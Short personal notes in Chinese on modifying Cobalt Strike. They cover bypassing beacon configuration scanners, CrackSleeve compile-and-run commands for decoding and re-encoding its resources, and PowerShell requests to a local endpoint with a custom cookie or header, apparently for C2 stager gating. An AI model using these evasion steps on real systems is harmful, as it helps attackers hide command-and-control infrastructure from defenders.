简单记录自己二开CS的一些注意事项，以防止遗忘.

注意：全部基于猫猫CS进行二开

## [二开CS的环境配置](https://pingmaoer.github.io/2020/06/24/CobaltStrike%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/)

```md
"Main Class" 处需要填写 Cobaltstrike.java
```

## Bypass cobaltstrike beacon config scan

[文章链接](https://cloud.tencent.com/developer/article/1764340)

[IDA文本搜索](https://blog.csdn.net/hgy413/article/details/6956847)

注意：

- 不要使用文章里的CrackSleeve.java，要使用Code文件夹下的CrackSleeve.java

- 所使用的两条命令(依旧不使用文章里的)：

  D:\Soft1\jdk\jdk17\bin\javac.exe -encoding UTF-8 -classpath cat_client.jar CrackSleeve.java

  D:\Soft1\jdk\jdk17\bin\java.exe -classpath cat_client.jar CrackSleeve

  D:\Soft1\jdk\jdk17\bin\java.exe -classpath CS_Client.jar CrackSleeve.java encode

## 自定义header头

```md

powershell:
复杂版本(能添加cookie):
$sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
$cookie = New-Object System.Net.Cookie;
$cookie.Name = "baidu";
$cookie.Value = "123456789";
$cookie.Domain = (New-Object Uri($url)).Host;
$sess.Cookies.Add($cookie);
irm -Uri "http://127.0.0.1:80/sb" -WebSession $sess


简洁版本(但不能添加cookie,有点鸡肋):
irm -Uri "http://127.0.0.1:80/sb" -Headers @{Authorization = "Bearer token"}
```

